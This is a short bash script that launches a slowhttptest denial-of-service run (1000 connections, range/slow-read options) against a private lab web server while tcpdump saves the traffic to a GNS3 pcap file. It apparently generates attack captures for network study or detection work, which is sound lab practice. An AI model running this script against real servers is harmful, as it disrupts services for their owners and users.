#!/bin/bash

TARGET_URL="http://192.168.10.3"
OUTPUT_PREFIX="slowread"
INTERFACE="eth0"
TCPDUMP_FILE="/home/kali/GNS3/pcap/${OUTPUT_PREFIX}_$(date +%Y%m%d_%H%M).pcap"

echo "[INFO] Starting tcpdump..."
sudo tcpdump -i "$INTERFACE" host 192.168.10.3 -w "$TCPDUMP_FILE" &
TCPDUMP_PID=$!

slowhttptest -c 1000 -R -g -o "$OUTPUT_PREFIX" -i 10 -r 200 -p 17 -u "$TARGET_URL"

echo "[INFO] Stopping tcpdump..."
kill "$TCPDUMP_PID"

echo "[INFO] Done."
